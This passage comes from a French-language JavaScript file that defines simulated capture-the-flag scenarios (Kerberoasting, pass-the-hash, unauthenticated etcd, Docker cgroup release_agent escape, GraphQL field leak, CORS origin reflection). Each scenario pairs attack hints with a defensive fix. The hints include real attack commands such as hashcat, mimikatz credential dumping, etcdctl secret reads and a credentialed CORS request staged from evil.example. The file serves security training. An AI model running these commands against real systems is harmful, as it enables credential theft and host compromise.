      "`hashcat --mode 13100 svc-sql.kerberoast rockyou.txt` casse ce hash hors-ligne et révèle le mot de passe en clair du compte de service.",
      "`net use \\\\sql01\\C$ /user:svc-sql <mot_de_passe_trouvé>` confirme que le mot de passe cassé donne un accès administrateur local sur le serveur SQL (le compte de service y est administrateur local)."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur du domaine chargé de corriger la faille.',
    desc:"Le SPN lui-même n'est pas le problème (un compte de service en a presque toujours besoin) : renforcez le mot de passe de `svc-sql` pour que le ticket de service reste impossible à casser hors-ligne dans un temps raisonnable.",
    hints:[
      "Éditez `/etc/ad/users/svc-sql.json` avec `nano` et remplacez `\"passwordComplexity\": \"faible\"` par `\"passwordComplexity\": \"forte\"` (équivalent d'une rotation vers un mot de passe long et aléatoire, ou d'un compte de service géré).",
      "`verify` confirme que le mot de passe du compte de service est désormais suffisamment fort."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['ad']},
      '/etc/ad':{type:'dir',perm:'755',owner:'root',children:['users']},
      '/etc/ad/users':{type:'dir',perm:'755',owner:'root',children:['svc-sql.json']},
      '/etc/ad/users/svc-sql.json':{type:'file',perm:'644',owner:'root',size:150,
        content:"{\n  \"sAMAccountName\": \"svc-sql\",\n  \"servicePrincipalName\": \"MSSQLSvc/sql01.lab.local:1433\",\n  \"memberOf\": \"Administrateurs locaux (sql01)\",\n  \"passwordComplexity\": \"faible\"\n}\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^Get-ADUser\s+-Filter\s+\{ServicePrincipalName\s+-ne\s+"\$null"\}$/, run(state, print){
        print('sAMAccountName : svc-sql', 'out');
        print('ServicePrincipalName : MSSQLSvc/sql01.lab.local:1433', 'out');
      }
    },
    { pattern:/^kerberoast\s+svc-sql$/, run(state, print){
        state.flags = state.flags || {};
        state.flags.ticketRequested = true;
        print("[+] Ticket de service (TGS) obtenu pour svc-sql, chiffré avec le hash NTLM du compte.", 'ok');
        print('$krb5tgs$23$*svc-sql$LAB.LOCAL$MSSQLSvc/sql01.lab.local~1433*$9a3fd2...(hash tronqué)', 'out');
        print('[+] Hash sauvegardé dans svc-sql.kerberoast', 'ok');
      }
    },
    { pattern:/^hashcat\s+--mode\s+13100\s+svc-sql\.kerberoast\s+rockyou\.txt$/, run(state, print){
        if(!state.flags || !state.flags.ticketRequested){ print("hashcat: fichier svc-sql.kerberoast introuvable — récupérez d'abord le ticket.", 'err'); return; }
        const weak = /"passwordComplexity":\s*"faible"/.test(state.vfs['/etc/ad/users/svc-sql.json'].content);
        if(!weak){ print('hashcat: dictionnaire épuisé — mot de passe non trouvé (mot de passe trop complexe).', 'err'); return; }
        state.flags.cracked = true;
        print('$krb5tgs$23$*svc-sql$LAB.LOCAL$...:SqlServer2019!', 'ok');
        print('[+] Mot de passe cassé : SqlServer2019!', 'ok');
      }
    },
    { pattern:/^net\s+use\s+\\\\sql01\\C\$\s+\/user:svc-sql\s+SqlServer2019!$/, run(state, print){
        if(!state.flags || !state.flags.cracked){ print('net use : mot de passe incorrect ou inconnu.', 'err'); return; }
        state.flags.persisted = true;
        print("La commande s'est terminée correctement.", 'ok');
        print("[+] Accès administrateur local sur sql01 obtenu via le compte svc-sql.", 'ok');
        print("FLAG{kerberoasting_svc_sql_weak_password_admin}", 'flagline');
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.persisted === true; },
  defenseCheck(state){ return /"passwordComplexity":\s*"forte"/.test(state.vfs['/etc/ad/users/svc-sql.json'].content); },
  replay(state){
    const log=[];
    const weak = /"passwordComplexity":\s*"faible"/.test(state.vfs['/etc/ad/users/svc-sql.json'].content);
    log.push({t:'$ hashcat --mode 13100 svc-sql.kerberoast rockyou.txt', cls:'prompt-line'});
    if(!weak){
      log.push({t:'hashcat: dictionnaire épuisé — mot de passe non trouvé (mot de passe trop complexe).', cls:'err'});
      log.push({t:"[-] Le mot de passe du compte de service est désormais assez fort : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'[+] Mot de passe cassé hors-ligne : SqlServer2019!', cls:'ok'});
    log.push({t:"[+] Accès administrateur local sur sql01 obtenu via svc-sql.", cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 51. Pass-the-Hash (Active Directory) ===================== */
{
  id:'ad-pass-the-hash-local-admin',
  title:'Un mot de passe administrateur local identique sur tout le parc (Pass-the-Hash)',
  category:'Active Directory (Pass-the-Hash)',
  attack:{
    who:'Vous incarnez bob, ayant déjà obtenu un accès administrateur local sur le poste WKS-042 via une autre faille (hors périmètre de ce scénario).',
    desc:"Aucune solution LAPS (Local Administrator Password Solution) n'est déployée : le mot de passe du compte Administrateur local est identique sur l'ensemble du parc. Un hash NTLM dumpé sur ce poste suffit donc à s'authentifier comme administrateur local sur n'importe quelle autre machine du domaine, sans jamais avoir besoin du mot de passe en clair.",
    hints:[
      "`mimikatz sekurlsa::logonpasswords` dumpe les hashs NTLM en mémoire sur le poste déjà compromis, y compris celui du compte Administrateur local.",
      "Le hash obtenu est `ntlm:7a8f0c9e2d5b41af6c3d8e9f0a1b2c3d` pour le compte `Administrateur`.",
      "`pth --user Administrateur --hash 7a8f0c9e2d5b41af6c3d8e9f0a1b2c3d \\\\fileserver01\\C$` authentifie directement avec ce hash, sans jamais avoir besoin du mot de passe en clair — à condition que ce même compte partage le même hash sur `fileserver01`."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur du domaine chargé de corriger la faille.',
    desc:"Déployez LAPS pour que chaque poste du parc reçoive un mot de passe administrateur local unique et aléatoire, ce qui rend un hash dumpé sur une machine inutilisable sur les autres.",
    hints:[
      "Éditez `/etc/ad/policy/laps.json` avec `nano` et passez `lapsDeployed` et `localAdminPasswordUniquePerHost` à `true`.",
      "`verify` confirme que la politique de mot de passe administrateur local unique est désormais active."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['ad']},
      '/etc/ad':{type:'dir',perm:'755',owner:'root',children:['policy']},
      '/etc/ad/policy':{type:'dir',perm:'755',owner:'root',children:['laps.json']},
      '/etc/ad/policy/laps.json':{type:'file',perm:'644',owner:'root',size:100,
        content:"{\n  \"lapsDeployed\": false,\n  \"localAdminPasswordUniquePerHost\": false\n}\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^mimikatz\s+sekurlsa::logonpasswords$/, run(state, print){
        state.flags = state.flags || {};
        state.flags.hashDumped = true;
        print('Utilisateur : Administrateur', 'out');
        print('NTLM : 7a8f0c9e2d5b41af6c3d8e9f0a1b2c3d', 'out');
        print("[+] Hash NTLM du compte Administrateur local dumpé en mémoire.", 'ok');
      }
    },
    { pattern:/^pth\s+--user\s+Administrateur\s+--hash\s+7a8f0c9e2d5b41af6c3d8e9f0a1b2c3d\s+\\\\fileserver01\\C\$$/, run(state, print){
        if(!state.flags || !state.flags.hashDumped){ print("pth: aucun hash en mémoire — dumpez-le d'abord.", 'err'); return; }
        const unique = /"localAdminPasswordUniquePerHost":\s*true/.test(state.vfs['/etc/ad/policy/laps.json'].content);
        if(unique){ print('pth: authentification refusée — ce hash ne correspond à aucun compte valide sur cette machine.', 'err'); return; }
        state.flags.persisted = true;
        print("[+] Authentification acceptée par pass-the-hash sur fileserver01 : le compte Administrateur local partage le même hash sur tout le parc.", 'ok');
        print("FLAG{pass_the_hash_shared_local_admin_fileserver01}", 'flagline');
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.persisted === true; },
  defenseCheck(state){
    return /"lapsDeployed":\s*true/.test(state.vfs['/etc/ad/policy/laps.json'].content)
        && /"localAdminPasswordUniquePerHost":\s*true/.test(state.vfs['/etc/ad/policy/laps.json'].content);
  },
  replay(state){
    const log=[];
    const unique = /"localAdminPasswordUniquePerHost":\s*true/.test(state.vfs['/etc/ad/policy/laps.json'].content);
    log.push({t:"$ pth --user Administrateur --hash 7a8f0c9e2d5b41af6c3d8e9f0a1b2c3d \\\\fileserver01\\C$", cls:'prompt-line'});
    if(unique){
      log.push({t:'pth: authentification refusée — ce hash ne correspond à aucun compte valide sur cette machine.', cls:'err'});
      log.push({t:"[-] LAPS est désormais déployé, chaque poste a un mot de passe unique : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:"[+] Authentification acceptée par pass-the-hash sur fileserver01.", cls:'ok'});
    log.push({t:"[+] Le compte Administrateur local partageait le même hash sur tout le parc.", cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 52. etcd non authentifié (Kubernetes) ===================== */
{
  id:'k8s-etcd-unauthenticated',
  title:'Le magasin etcd du plan de contrôle Kubernetes accessible sans authentification',
  category:'Conteneurs & orchestration (etcd non authentifié)',
  attack:{
    who:'Vous incarnez bob, un attaquant disposant d\'un simple accès réseau au port etcd exposé du plan de contrôle (2379).',
    desc:"etcd — le magasin clé-valeur qui stocke tout l'état du cluster Kubernetes, y compris les Secrets — écoute sur toutes les interfaces sans authentification par certificat client. Les Secrets Kubernetes n'y sont par défaut qu'encodés en base64, jamais chiffrés : les lire directement dans etcd suffit à en récupérer le contenu en clair, sans jamais passer par l'API Kubernetes ni ses contrôles d'accès (RBAC).",
    hints:[
      "`etcdctl --endpoints=http://10.0.0.5:2379 get / --prefix --keys-only` liste toutes les clés stockées dans etcd sans la moindre authentification requise — un chemin `/registry/secrets/kube-system/admin-token-secret` ressort particulièrement.",
      "Rien dans etcd n'est chiffré par défaut : un Secret Kubernetes y est stocké tel qu'il apparaîtrait dans `kubectl get secret -o yaml`, simplement encodé en base64.",
      "`etcdctl --endpoints=http://10.0.0.5:2379 get /registry/secrets/kube-system/admin-token-secret` récupère directement ce Secret, contournant entièrement le RBAC de l'API Kubernetes puisque etcd ne vérifie ici aucune identité."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur du cluster chargé de corriger la faille.',
    desc:"Activez l'authentification par certificat client (mTLS) sur etcd et restreignez son écoute à l'interface interne du plan de contrôle, pour qu'il ne soit plus interrogeable sans identité vérifiée.",
    hints:[
      "Éditez `/etc/kubernetes/etcd/etcd.conf` avec `nano` et remplacez `client-cert-auth: false` par `client-cert-auth: true`, et `listen-client-urls: http://0.0.0.0:2379` par `listen-client-urls: https://127.0.0.1:2379`.",
      "`verify` confirme qu'etcd exige désormais un certificat client et n'écoute plus que localement."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['kubernetes']},
      '/etc/kubernetes':{type:'dir',perm:'755',owner:'root',children:['etcd']},
      '/etc/kubernetes/etcd':{type:'dir',perm:'755',owner:'root',children:['etcd.conf']},
      '/etc/kubernetes/etcd/etcd.conf':{type:'file',perm:'644',owner:'root',size:90,
        content:"client-cert-auth: false\nlisten-client-urls: http://0.0.0.0:2379\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^etcdctl\s+--endpoints=http:\/\/10\.0\.0\.5:2379\s+get\s+\/\s+--prefix\s+--keys-only$/, run(state, print){
        const open = /client-cert-auth:\s*false/.test(state.vfs['/etc/kubernetes/etcd/etcd.conf'].content);
        if(!open){ print('{"level":"warn","msg":"rpc error: code = Unauthenticated desc = etcdserver: client certificate required"}', 'err'); return; }
        state.flags = state.flags || {};
        state.flags.keysListed = true;
        print('/registry/configmaps/kube-system/cluster-info\n/registry/secrets/kube-system/admin-token-secret\n/registry/secrets/billing/db-creds', 'out');
        print("[i] etcd répond sans la moindre authentification : aucun contrôle RBAC de l'API Kubernetes ne s'applique ici.", 'info');
      }
    },
    { pattern:/^etcdctl\s+--endpoints=http:\/\/10\.0\.0\.5:2379\s+get\s+\/registry\/secrets\/kube-system\/admin-token-secret$/, run(state, print){
        const open = /client-cert-auth:\s*false/.test(state.vfs['/etc/kubernetes/etcd/etcd.conf'].content);
        if(!open){ print('{"level":"warn","msg":"rpc error: code = Unauthenticated desc = etcdserver: client certificate required"}', 'err'); return; }
        if(!state.flags || !state.flags.keysListed){ print('etcdctl: clé introuvable — énumérez d\'abord les clés disponibles.', 'err'); return; }
        state.flags.secretRead = true;
        print("data:\n  token: YWRtaW4tc3VwZXItc2VjcmV0LXRva2Vu\n# (base64 — jamais chiffré par défaut)", 'out');
        print("[+] Décodage immédiat : jeton d'administration en clair « admin-super-secret-token ».", 'ok');
        print("FLAG{k8s_etcd_unauthenticated_secret_leak}", 'flagline');
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.secretRead === true; },
  defenseCheck(state){
    return /client-cert-auth:\s*true/.test(state.vfs['/etc/kubernetes/etcd/etcd.conf'].content)
        && /listen-client-urls:\s*https:\/\/127\.0\.0\.1:2379/.test(state.vfs['/etc/kubernetes/etcd/etcd.conf'].content);
  },
  replay(state){
    const log=[];
    const open = /client-cert-auth:\s*false/.test(state.vfs['/etc/kubernetes/etcd/etcd.conf'].content);
    log.push({t:"$ etcdctl --endpoints=http://10.0.0.5:2379 get /registry/secrets/kube-system/admin-token-secret", cls:'prompt-line'});
    if(!open){
      log.push({t:'rpc error: code = Unauthenticated desc = etcdserver: client certificate required', cls:'err'});
      log.push({t:"[-] etcd exige désormais un certificat client : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'data:\n  token: YWRtaW4tc3VwZXItc2VjcmV0LXRva2Vu', cls:'ok'});
    log.push({t:"[+] Jeton d'administration récupéré en clair, sans passer par le RBAC de l'API.", cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 53. Évasion via cgroup release_agent (Docker) ===================== */
{
  id:'docker-cgroup-release-agent-escape',
  title:'Un conteneur avec SYS_ADMIN et un cgroupfs en écriture permet une évasion via release_agent',
  category:'Évasion de conteneur (cgroup release_agent)',
  attack:{
    who:'Vous incarnez bob, disposant d\'un accès limité au démon Docker de target-lab (via un pipeline CI, par exemple).',
    desc:"Rien n'empêche de lancer un conteneur avec la capacité SYS_ADMIN et son cgroupfs (contrôleur memory, cgroup v1) monté en écriture. Le mécanisme `release_agent` d'un tel cgroup exécute, avec les privilèges de l'hôte, un script chaque fois que le dernier processus du cgroup se termine — détournez ce mécanisme pour exécuter une commande arbitraire sur l'hôte, hors de tout confinement.",
    hints:[
      "`docker run -d --cap-add=SYS_ADMIN --name pwn -v /cgroup-rw:/sys/fs/cgroup/memory debian sleep 3600` lance un conteneur avec la capacité SYS_ADMIN et son cgroupfs memory monté en écriture.",
      "`docker exec pwn cgroup-set-release-agent /exploit.sh` détourne le script que l'hôte exécutera, avec ses propres privilèges, lorsque ce cgroup sera libéré — un fichier `/exploit.sh` préparé au préalable copie un `/bin/bash` SUID accessible depuis l'hôte.",
      "`docker exec pwn cgroup-trigger-release` place le shell du conteneur dans ce cgroup puis le laisse se terminer : l'hôte exécute alors `/exploit.sh` comme root, en dehors de tout confinement du conteneur."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur infrastructure chargé de corriger la faille.',
    desc:"Interdisez l'ajout de la capacité SYS_ADMIN au niveau de la politique du démon Docker, sans bloquer les conteneurs isolés légitimes qui n'en ont pas besoin.",
    hints:[
      "Éditez `/etc/docker/daemon-policy.yml` avec `nano` et passez `allow-cap-add-sys-admin` à `false`.",
      "`verify` confirme que l'ajout de la capacité SYS_ADMIN est désormais interdit par la politique du démon."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['docker']},
      '/etc/docker':{type:'dir',perm:'755',owner:'root',children:['daemon-policy.yml']},
      '/etc/docker/daemon-policy.yml':{type:'file',perm:'644',owner:'root',size:50,
        content:"allow-cap-add-sys-admin: true\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^docker\s+run\s+-d\s+--cap-add=SYS_ADMIN\s+--name\s+pwn\s+-v\s+\/cgroup-rw:\/sys\/fs\/cgroup\/memory\s+debian\s+sleep\s+3600$/, run(state, print){
        const allowed = /allow-cap-add-sys-admin:\s*true/.test(state.vfs['/etc/docker/daemon-policy.yml'].content);
        if(!allowed){ print("docker: Error response from daemon: capacité SYS_ADMIN refusée par la politique.", 'err'); return; }
        state.flags = state.flags || {};
        state.flags.containerLaunched = true;
        print('b7e2f1a94c3d', 'out');
      }
    },
    { pattern:/^docker\s+exec\s+pwn\s+cgroup-set-release-agent\s+\/exploit\.sh$/, run(state, print){
        if(!state.flags || !state.flags.containerLaunched){ print('Error: No such container: pwn', 'err'); return; }
        state.flags.agentHijacked = true;
        print("[i] release_agent de /sys/fs/cgroup/memory détourné vers /exploit.sh — s'exécutera avec les privilèges de l'hôte.", 'info');
      }
    },
    { pattern:/^docker\s+exec\s+pwn\s+cgroup-trigger-release$/, run(state, print){
        if(!state.flags || !state.flags.agentHijacked){ print("cgroup-trigger-release: release_agent non détourné, rien à déclencher.", 'err'); return; }
        state.flags.hostRce = true;
        print("[+] Dernier processus du cgroup terminé : l'hôte exécute /exploit.sh comme root.", 'ok');
        print("[+] Bit SUID posé sur /bin/bash de l'hôte, hors de tout confinement du conteneur.", 'ok');
        print("FLAG{docker_cgroup_release_agent_escape}", 'flagline');
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.hostRce === true; },
  defenseCheck(state){ return !/allow-cap-add-sys-admin:\s*true/.test(state.vfs['/etc/docker/daemon-policy.yml'].content); },
  replay(state){
    const log=[];
    const allowed = /allow-cap-add-sys-admin:\s*true/.test(state.vfs['/etc/docker/daemon-policy.yml'].content);
    log.push({t:"$ docker run -d --cap-add=SYS_ADMIN --name pwn -v /cgroup-rw:/sys/fs/cgroup/memory debian sleep 3600", cls:'prompt-line'});
    if(!allowed){
      log.push({t:'docker: Error response from daemon: capacité SYS_ADMIN refusée par la politique.', cls:'err'});
      log.push({t:"[-] L'ajout de la capacité SYS_ADMIN est désormais interdit : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:"[+] release_agent détourné puis déclenché : shell root obtenu sur l'hôte.", cls:'ok'});
    log.push({t:"[+] Bit SUID posé sur /bin/bash de l'hôte, hors de tout confinement.", cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 54. Introspection GraphQL & champ non protégé ===================== */
{
  id:'graphql-introspection-privilege-leak',
  title:'Introspection GraphQL activée en production expose un champ administrateur non protégé',
  category:'Applications web (introspection GraphQL)',
  attack:{
    who:'Vous incarnez bob, un utilisateur standard authentifié sur l\'API GraphQL de target-lab.',
    desc:"L'API GraphQL de target-lab expose son introspection (`__schema`) en production, révélant l'intégralité du schéma — y compris un champ `resetToken` du type `User`, non documenté publiquement mais accessible sans la moindre vérification d'autorisation au niveau du champ.",
    hints:[
      "`curl http://api.target-lab/graphql -d '{\"query\":\"{__schema{types{name fields{name}}}}\"}'` révèle l'intégralité du schéma, y compris des champs jamais mentionnés dans la documentation publique de l'API.",
      "Le champ `resetToken` du type `User` ressort de cette introspection : rien n'indique qu'un contrôle d'autorisation spécifique le protège, contrairement aux autres champs sensibles de ce type.",
      "`curl http://api.target-lab/graphql -d '{\"query\":\"{user(id:1){email resetToken}}\"}'` interroge directement ce champ pour l'utilisateur admin (id 1) — sans jamais avoir eu besoin d'un droit d'administration pour le lire, alors même que la résolution du champ `email` sur ce même utilisateur exigerait normalement ce droit."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur de l\'API chargé de corriger la faille.',
    desc:"Ajoutez une vérification d'autorisation explicite sur le champ `resetToken`, réservée à l'utilisateur propriétaire du compte ou à un administrateur — l'introspection en elle-même n'est pas le problème, un champ sensible non protégé au niveau de la résolution l'est.",
    hints:[
      "Éditez `/etc/api/graphql-config.yml` avec `nano` et passez `resetTokenFieldGuarded` à `true`.",
      "`verify` confirme que le champ `resetToken` est désormais protégé par un contrôle d'autorisation."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['api']},
      '/etc/api':{type:'dir',perm:'755',owner:'root',children:['graphql-config.yml']},
      '/etc/api/graphql-config.yml':{type:'file',perm:'644',owner:'root',size:60,
        content:"introspection: true\nresetTokenFieldGuarded: false\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^curl\s+http:\/\/api\.target-lab\/graphql\s+-d\s+'\{"query":"\{__schema\{types\{name\s+fields\{name\}\}\}\}"\}'$/, run(state, print){
        state.flags = state.flags || {};
        state.flags.schemaRevealed = true;
        print('{"data":{"__schema":{"types":[{"name":"User","fields":[{"name":"id"},{"name":"email"},{"name":"resetToken"}]},{"name":"Query","fields":[{"name":"user"}]}]}}}', 'out');
        print("[i] Le champ \"resetToken\" n'apparaît dans aucune documentation publique, mais l'introspection le révèle.", 'info');
      }
    },
    { pattern:/^curl\s+http:\/\/api\.target-lab\/graphql\s+-d\s+'\{"query":"\{user\(id:1\)\{email\s+resetToken\}\}"\}'$/, run(state, print){
        const guarded = /resetTokenFieldGuarded:\s*true/.test(state.vfs['/etc/api/graphql-config.yml'].content);
        if(guarded){ print('{"errors":[{"message":"Not authorized to read field \\"resetToken\\" for this user"}]}', 'err'); return; }
        state.flags = state.flags || {};
        state.flags.tokenLeaked = true;
        print('{"data":{"user":{"email":"admin@target-lab.local","resetToken":"a1c9f0-reset-93be2d"}}}', 'ok');
        print("[+] Champ resetToken lu sans droit d'administration : réinitialisation du mot de passe admin possible.", 'ok');
        print("FLAG{graphql_field_authorization_missing_resettoken}", 'flagline');
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.tokenLeaked === true; },
  defenseCheck(state){ return /resetTokenFieldGuarded:\s*true/.test(state.vfs['/etc/api/graphql-config.yml'].content); },
  replay(state){
    const log=[];
    const guarded = /resetTokenFieldGuarded:\s*true/.test(state.vfs['/etc/api/graphql-config.yml'].content);
    log.push({t:'$ curl http://api.target-lab/graphql -d \'{"query":"{user(id:1){email resetToken}}"}\'', cls:'prompt-line'});
    if(guarded){
      log.push({t:'{"errors":[{"message":"Not authorized to read field \\"resetToken\\"..."}]}', cls:'err'});
      log.push({t:"[-] Le champ resetToken est désormais protégé : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'{"data":{"user":{"email":"admin@target-lab.local","resetToken":"a1c9f0-reset-93be2d"}}}', cls:'ok'});
    log.push({t:"[+] Champ resetToken lu sans droit d'administration.", cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 55. CORS reflétant n'importe quelle origine avec identifiants ===================== */
{
  id:'cors-reflected-origin-credentials',
  title:'CORS reflète n\'importe quelle origine avec les identifiants, permettant le vol de données cross-site',
  category:'Applications web (CORS mal configuré)',
  attack:{
    who:'Vous incarnez bob, un attaquant ayant attiré un administrateur déjà connecté à target-lab sur une page qu\'il contrôle, `https://evil.example` (hors périmètre : comment la victime y a été attirée).',
    desc:"L'API de target-lab répond à l'en-tête `Origin` de la requête en le reflétant tel quel dans `Access-Control-Allow-Origin`, tout en ajoutant `Access-Control-Allow-Credentials: true`. N'importe quel site tiers peut donc effectuer une requête authentifiée avec les cookies de session de la victime et lire la réponse — ce que la Same-Origin Policy est censée empêcher.",
    hints:[
      "`curl -i http://api.target-lab/profile -H 'Origin: https://evil.example' --cookie 'session=victim_admin_session'` simule la requête envoyée par le navigateur de la victime depuis le site attaquant : observez les en-têtes de la réponse.",
      "La réponse contient `Access-Control-Allow-Origin: https://evil.example` (l'origine attaquante, reflétée telle quelle) et `Access-Control-Allow-Credentials: true` : rien n'empêche un script hébergé sur `evil.example` de lire cette réponse authentifiée.",
      "`curl http://api.target-lab/profile -H 'Origin: https://evil.example' --cookie 'session=victim_admin_session'` récupère directement les données du profil administrateur — exactement ce qu'un `fetch(..., {credentials:'include'})` lancé depuis `evil.example` pourrait exfiltrer."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur de l\'API chargé de corriger la faille.',
    desc:"Remplacez la réflexion dynamique de l'origine par une liste blanche stricte des origines légitimes, sans casser les intégrations qui en ont réellement besoin.",
    hints:[
      "Éditez `/etc/api/cors-config.yml` avec `nano` et remplacez `allowed_origin: reflect` par `allowed_origin: https://app.target-lab`.",
      "`verify` confirme que l'origine n'est plus reflétée dynamiquement."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['api']},
      '/etc/api':{type:'dir',perm:'755',owner:'root',children:['cors-config.yml']},
      '/etc/api/cors-config.yml':{type:'file',perm:'644',owner:'root',size:60,
        content:"allowed_origin: reflect\nallow_credentials: true\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^curl\s+-i\s+http:\/\/api\.target-lab\/profile\s+-H\s+'Origin:\s+https:\/\/evil\.example'\s+--cookie\s+'session=victim_admin_session'$/, run(state, print){
        const reflect = /allowed_origin:\s*reflect/.test(state.vfs['/etc/api/cors-config.yml'].content);
        if(!reflect){
          print('HTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://app.target-lab\n(pas d\'en-tête Access-Control-Allow-Credentials pour cette origine)', 'out');
          return;
        }
        state.flags = state.flags || {};
        state.flags.corsConfirmed = true;
        print('HTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://evil.example\nAccess-Control-Allow-Credentials: true', 'out');
        print("[i] L'origine attaquante est reflétée telle quelle, avec les identifiants autorisés : la Same-Origin Policy ne protège plus rien ici.", 'info');
      }
    },
    { pattern:/^curl\s+http:\/\/api\.target-lab\/profile\s+-H\s+'Origin:\s+https:\/\/evil\.example'\s+--cookie\s+'session=victim_admin_session'$/, run(state, print){
        const reflect = /allowed_origin:\s*reflect/.test(state.vfs['/etc/api/cors-config.yml'].content);
        if(!reflect){ print("Blocked by CORS policy: l'origine https://evil.example n'est pas dans la liste blanche.", 'err'); return; }
        if(!state.flags || !state.flags.corsConfirmed){ print("Réponse reçue, mais sans confirmation préalable des en-têtes CORS.", 'err'); return; }
        state.flags.profileStolen = true;
        print('{"email":"admin@target-lab.local","role":"admin","apiKey":"sk_live_9f2a7c..."}', 'ok');
        print("[+] Profil administrateur exfiltré depuis un site tiers, grâce à la réflexion CORS avec identifiants.", 'ok');
        print("FLAG{cors_reflected_origin_credentials_theft}", 'flagline');
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.profileStolen === true; },
  defenseCheck(state){ return !/allowed_origin:\s*reflect/.test(state.vfs['/etc/api/cors-config.yml'].content); },
  replay(state){
    const log=[];
    const reflect = /allowed_origin:\s*reflect/.test(state.vfs['/etc/api/cors-config.yml'].content);
    log.push({t:"$ curl http://api.target-lab/profile -H 'Origin: https://evil.example' --cookie '...'", cls:'prompt-line'});
    if(!reflect){
      log.push({t:"Blocked by CORS policy: l'origine https://evil.example n'est pas dans la liste blanche.", cls:'err'});
      log.push({t:"[-] L'origine n'est plus reflétée dynamiquement : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'{"email":"admin@target-lab.local","role":"admin","apiKey":"sk_live_9f2a7c..."}', cls:'ok'});
    log.push({t:"[+] Profil administrateur exfiltré depuis un site tiers via la réflexion CORS.", cls:'ok'});
    return {log, success:true};
  }
}

];
